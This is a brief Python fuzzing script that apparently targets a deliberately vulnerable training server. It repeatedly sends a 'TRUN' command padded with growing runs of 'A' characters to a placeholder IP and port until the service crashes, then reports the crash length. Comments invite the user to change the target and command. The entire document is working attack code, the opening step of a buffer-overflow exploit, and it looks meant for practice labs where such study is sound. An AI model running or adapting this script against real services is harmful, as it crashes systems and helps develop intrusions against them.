import socket

from time import sleep
import sys

numberOfCharacters = 100 ## ---> You can change here.

stringToSend = "TRUN /.:/" + "A" * numberOfCharacters ## ---> Change TRUN here.

while True : 

    try:

        Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        Socket.connect(("10.10.10.10", 9999)) ## ---> Change IP Address and port

        bytes = stringToSend.encode(encoding = "latin1") ## ---> You can change latin1
        
        Socket.send(bytes)

        Socket.close()

        stringToSend = stringToSend + "A" * numberOfCharacters

        sleep(1)

    except KeyboardInterrupt:

        print("Crashed at: " + str(len(stringToSend)))

        sys.exit()

    except Exception as Error:

        print("Crashed at: " + str(len(stringToSend)))

        print(Error)

        sys.exit()

